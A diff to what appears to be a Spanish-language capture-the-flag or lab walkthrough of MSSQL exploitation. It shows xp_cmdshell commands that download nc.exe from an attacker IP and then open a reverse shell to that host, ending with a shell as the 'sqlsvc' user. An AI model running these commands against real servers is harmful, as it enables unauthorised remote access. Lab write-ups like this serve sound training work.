@@ -238,7 +238,7 @@ En caso de que no nos deje modificamos la configuracion con habilitando la edici
 SP_CONFIGURE "show advanced options", 1
 ```
 
-A continuacion tendremos que ejecutar un
+A continuación tendremos que ejecutar un
 ```shell
 RECONFIGURE
 ```
@@ -262,4 +262,12 @@ Para poder ganar acceso mediante shell nos obtendremos en el servidor de MSSQL u
 ```shell
 xp_cmdshell "curl 10.10.15.165:8080/nc.exe -o C:\Temp\netcat.exe"
 ```
+
+En nuestra maquina atacante nos ponemos en escucha y nos enviamos una shell desde la maquina Windows
+```shell
+xp_cmdshell "C:\Temp\netcat.exe -e cmd 10.10.15.165 443"
+```
+
+Obteniendo una shell en nuestra maquina atacante como el usuario `sqlsvc`, viendo el directorio `Users` observamos que hay otro usuario llamado `miscsvc`
+
 
